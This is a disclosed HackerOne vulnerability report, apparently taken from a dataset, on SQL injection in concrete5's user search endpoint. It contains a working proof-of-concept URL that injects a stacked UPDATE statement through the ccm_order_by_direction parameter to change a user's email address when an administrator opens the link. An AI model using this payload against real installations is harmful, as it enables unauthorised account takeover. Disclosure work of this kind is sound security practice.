---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '38778'
original_report_id: '38778'
title: SQL injection in conc/index.php/ccm/system/search/users/submit
weakness: SQL Injection
team_handle: concretecms
created_at: '2014-12-09T06:53:56.956Z'
disclosed_at: '2016-04-26T23:29:07.469Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- sql-injection
---

# SQL injection in conc/index.php/ccm/system/search/users/submit

## Metadata

- HackerOne Report ID: 38778
- Weakness: SQL Injection
- Program: concretecms
- Disclosed At: 2016-04-26T23:29:07.469Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello.
I found SQL injection in conc/index.php/ccm/system/search/users/submit

PoC is below

When User login as Administrator
the user open this link

http://172.20.0.49/conc/index.php/ccm/system/search/users/submit?&ccm_order_by=u.uEmail&ccm_order_by_direction=desc;UPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202;--

and update user's email address.
and I think I can do various things ;)

I tested to work concrete5 5.7.2.1 on Apache(using ammps) Windows8

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
